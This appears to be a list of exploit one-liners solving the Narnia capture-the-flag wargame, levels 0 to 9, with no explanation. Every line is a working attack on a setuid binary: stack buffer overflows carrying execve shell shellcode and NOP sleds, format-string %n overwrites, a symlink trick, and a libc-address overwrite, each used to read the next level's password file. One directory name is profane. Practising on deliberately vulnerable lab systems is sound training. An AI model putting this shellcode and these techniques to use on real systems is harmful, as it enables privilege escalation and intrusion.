0->1 -  (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';echo whoami;echo cat /etc/narnia_pass/narnia1) | /narnia/narnia0

1->2 - export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' && ((echo whoami; echo cat /etc/narnia_pass/narnia2) | /narnia/narnia1)

2->3 - (echo whoami && echo cat /etc/narnia_pass/narnia3) | /narnia/narnia2 $(python -c 'print "\x90"*(103-20) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + 7*"\xf8\xd5\xff\xff" ')

3->4 -  (mkdir /tmp/FuckTheGlobsterAllNightLong && mkdir /tmp/FuckTheGlobsterAllNightLong/tmp && ln -s /etc/narnia_pass/narnia4 /tmp/FuckTheGlobsterAllNightLong/tmp/pass && touch /tmp/pass && chmod a=r+w /tmp/pass && /narnia/narnia3 /tmp/FuckTheGlobsterAllNightLong/tmp/pass | cat) && cat /tmp/pass

4->5 - (echo whoami; echo cat /etc/narnia_pass/narnia5) |/narnia/narnia4 $(python -c 'print "\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +"B"*56+ "\xb8\xd4\xff\xff"*20')

5->6 - /narnia/narnia5 BBBB$'\xd0\xd6\xff\xff'%.492d%n

6->7 - (echo whoami; echo cat /etc/narnia_pass/narnia7) | /narnia/narnia6 AAAABBBB$'\x50\xc8\xe4\xf7' CCCCDDD
D/bin/sh

7->8 - (echo whoami; echo cat /etc/narnia_pass/narnia8; cat) | /narnia/narnia7 $'\x3a\xd6\xff\xff\x38\xd6\xff
\xff'%2044x%2\$hn%32544x%3\$hn

8->9 - export EGGY=$(python -c 'print "\x90"*0x200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") && (echo whoami; echo cat /etc/narnia_pass/narnia9; cat) | /narnia/narnia8 $'AAAABBBBDDDDCCCCEEEE\x7c' $'\xd8\xd6\xff\xff\xa8\xd4\xff\xff\x8b\xd7\xff\xff'

